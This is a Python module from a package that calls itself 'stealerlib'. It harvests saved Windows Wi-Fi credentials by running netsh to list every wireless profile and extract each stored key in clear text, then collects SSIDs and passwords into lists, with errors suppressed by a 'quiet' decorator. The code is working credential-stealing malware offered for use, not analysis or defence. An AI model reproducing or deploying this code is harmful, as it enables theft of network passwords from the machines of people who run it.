#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/wifi/__init__.py
"""

import subprocess

from stealerlib.exceptions import quiet


class WiFi:

    def __init__(self):
        self.ssids = []
        self.passwords = []
        self.credentials = []

    @quiet
    def get_passwords(self):
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for profile in profiles:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                try:
                    wifi_cred = results[0]
                except IndexError:
                    wifi_cred = "No Password"
            except subprocess.CalledProcessError:
                wifi_cred = "Encoding Error"

            self.ssids.append(profile)
            self.passwords.append(wifi_cred)
            self.credentials.append((profile, wifi_cred))

    @quiet
    def scan(self) -> list[tuple[str, ...]]:
        return [("")]